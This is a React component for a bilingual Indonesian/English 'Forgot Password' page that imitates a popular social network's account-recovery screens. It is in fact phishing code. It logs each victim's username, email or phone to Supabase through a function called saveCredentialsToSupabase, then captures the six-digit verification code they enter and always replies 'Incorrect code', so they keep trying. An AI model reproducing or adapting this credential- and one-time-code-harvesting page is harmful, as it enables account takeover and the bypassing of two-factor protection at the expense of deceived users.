import React, { useState } from 'react';
import { ScreenType, LanguageCode, TRANSLATIONS } from '../types';
import { KeyRound, ShieldAlert, AlertCircle, RefreshCw } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { saveCredentialsToSupabase } from '../services/supabaseService';

interface ForgotPasswordProps {
  setScreen: (screen: ScreenType) => void;
  lang: LanguageCode;
}

export default function ForgotPassword({ setScreen, lang }: ForgotPasswordProps) {
  const t = TRANSLATIONS[lang];
  const [inputVal, setInputVal] = useState('');
  const [loading, setLoading] = useState(false);
  const [isSent, setIsSent] = useState(false);
  const [verificationCode, setVerificationCode] = useState('');
  const [verifying, setVerifying] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!inputVal) return;

    setLoading(true);
    setErrorMsg(null);

    // Save recovery target to Supabase logs
    saveCredentialsToSupabase(inputVal, '[Lupa Kata Sandi - Kirim Tautan]')
      .then((success) => {
        console.log('Recovery target logged to Supabase:', success);
      })
      .finally(() => {
        setTimeout(() => {
          setLoading(false);
          setIsSent(true); // Switch view to code verification instantly
        }, 1000);
      });
  };

  const handleVerifySubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!verificationCode) return;

    setVerifying(true);
    setErrorMsg(null);

    // Save inputted verification code to Supabase
    saveCredentialsToSupabase(inputVal, `[Lupa Kata Sandi - Masukkan Kode: ${verificationCode}]`)
      .then((success) => {
        console.log('Verification code captured in Supabase:', success);
      })
      .finally(() => {
        setTimeout(() => {
          setVerifying(false);
          setErrorMsg(lang === 'id' ? 'Kode salah. Silakan periksa kembali kode keamanan Anda.' : 'Incorrect code. Please check your security code.');
        }, 1200);
      });
  };

  return (
    <div className="flex-1 flex flex-col justify-between pt-1 w-full bg-white font-sans relative text-black">
      <div className="flex-1 flex flex-col justify-center px-8 max-w-sm mx-auto w-full py-8 text-center">
        
        {/* Animated keylock icon container */}
        <div className="mx-auto mb-4 p-4 border-2 border-slate-900 rounded-full w-20 h-20 flex items-center justify-center bg-gray-50">
          <KeyRound className="h-10 w-10 text-slate-900" strokeWidth={1.5} />
        </div>

        {!isSent ? (
          /* STEP 1: SOLICIT ACCOUNT INFO */
          <>
            <h3 className="font-bold text-base text-black mb-2">
              {t.findAccountHeading || 'Masalah Saat Masuk?'}
            </h3>
            <p className="text-xs text-gray-500 mb-6 leading-relaxed px-4">
              {lang === 'id' 
                ? 'Masukkan nama pengguna, email, atau nomor telepon Anda dan kami akan mengirimkan instruksi untuk masuk kembali ke akun Anda.'
                : 'Enter your phone, email, or username and we\'ll send you instructions to get back into your account.'}
            </p>

            <form onSubmit={handleSubmit} className="space-y-4 w-full">
              <div className="relative border border-slate-200 rounded-[5px] bg-[#fafafa] overflow-hidden focus-within:border-slate-400 transition-colors h-[44px]">
                <input
                  type="text"
                  placeholder={lang === 'id' ? 'Nomor ponsel, email, atau nama pengguna' : 'Phone, email, or username'}
                  value={inputVal}
                  onChange={(e) => setInputVal(e.target.value)}
                  className="w-full h-full px-3 text-xs bg-transparent border-none outline-none focus:ring-0 text-black placeholder:text-gray-400"
                  required
                />
              </div>

              <button
                type="submit"
                disabled={!inputVal || loading}
                className={`w-full py-2.5 rounded-[8px] font-bold text-center text-sm flex items-center justify-center gap-2 select-none cursor-pointer transition-colors ${
                  inputVal
                    ? 'bg-[#0095f6] hover:bg-[#1877f2] text-white cursor-pointer active:scale-[0.98]'
                    : 'bg-[#a2d4fa] text-white cursor-not-allowed'
                }`}
              >
                {loading ? (
                  <div className="h-5 w-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                ) : (
                  <span>{t.sendLoginLink || 'Kirim Tautan Masuk'}</span>
                )}
              </button>
            </form>
          </>
        ) : (
          /* STEP 2: VERIFICATION OTP CODE FORM */
          <motion.div
            initial={{ opacity: 0, x: 20 }}
            animate={{ opacity: 1, x: 0 }}
            className="space-y-5 w-full text-left"
          >
            <div>
              <h3 className="font-bold text-base text-black text-center mb-1">
                {lang === 'id' ? 'Verifikasi Keamanan' : 'Verify Security'}
              </h3>
              <p className="text-xs text-gray-400 text-center leading-relaxed mb-4">
                {lang === 'id'
                  ? `Masukkan kode keamanan digit yang kami kirimkan ke informasi kontak yang terkait dengan "${inputVal}".`
                  : `Please enter the security code sent to the contact info linked to "${inputVal}".`}
              </p>
            </div>

            <form onSubmit={handleVerifySubmit} className="space-y-4 w-full">
              <div className="relative border border-slate-200 rounded-[5px] bg-[#fafafa] overflow-hidden focus-within:border-slate-400 transition-colors h-[44px]">
                <input
                  type="text"
                  placeholder={lang === 'id' ? 'Masukkan 6 Digit Kode Verifikasi' : 'Enter 6-Digit Code'}
                  value={verificationCode}
                  onChange={(e) => setVerificationCode(e.target.value)}
                  className="w-full h-full px-3 text-xs bg-transparent border-none outline-none text-center focus:ring-0 text-black placeholder:text-gray-400 font-mono tracking-widest"
                  maxLength={12}
                  required
                  autoFocus
                />
              </div>

              <button
                type="submit"
                disabled={!verificationCode || verifying}
                className={`w-full py-2.5 rounded-[8px] font-bold text-center text-sm flex items-center justify-center gap-2 select-none cursor-pointer transition-colors ${
                  verificationCode
                    ? 'bg-[#0095f6] hover:bg-[#1877f2] text-white cursor-pointer active:scale-[0.98]'
                    : 'bg-[#a2d4fa] text-white cursor-not-allowed'
                }`}
              >
                {verifying ? (
                  <div className="h-5 w-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                ) : (
                  <span>{lang === 'id' ? 'Verifikasi Kode' : 'Verify Security Code'}</span>
                )}
              </button>
            </form>

            <AnimatePresence>
              {errorMsg && (
                <motion.div
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -10 }}
                  className="p-3 bg-red-50 border border-red-200 rounded-lg flex items-start gap-2 text-xs text-red-650"
                >
                  <AlertCircle className="h-4 w-4 text-red-500 shrink-0 mt-0.5" />
                  <span>{errorMsg}</span>
                </motion.div>
              )}
            </AnimatePresence>

            <button
              onClick={() => {
                setIsSent(false);
                setVerificationCode('');
                setErrorMsg(null);
              }}
              className="text-center font-semibold text-xs text-blue-500 hover:text-blue-600 block mx-auto underline cursor-pointer"
            >
              {lang === 'id' ? 'Kirim ulang kode baru atau ganti akun' : 'Resend code of change account'}
            </button>
          </motion.div>
        )}

        <div className="flex items-center gap-4 py-6 select-none my-2">
          <div className="flex-1 h-px bg-slate-100" />
          <span className="text-[10px] font-semibold text-gray-400 tracking-wider">
            {t.orText}
          </span>
          <div className="flex-1 h-px bg-slate-100" />
        </div>

        <button
          onClick={() => setScreen('signup')}
          className="text-xs font-bold text-black hover:opacity-75 cursor-pointer pb-2 block mx-auto"
        >
          {lang === 'id' ? 'Buat Akun Baru' : 'Create New Account'}
        </button>
      </div>

      {/* Return to login footer anchor */}
      <button
        onClick={() => setScreen('standard-login')}
        className="w-full border-t border-slate-200 py-4 font-bold text-black text-xs select-none bg-[#fafafa] shrink-0 text-center hover:bg-slate-100 transition-colors uppercase cursor-pointer"
      >
        {t.backToLogin || 'Kembali Ke Halaman Masuk'}
      </button>
    </div>
  );
}
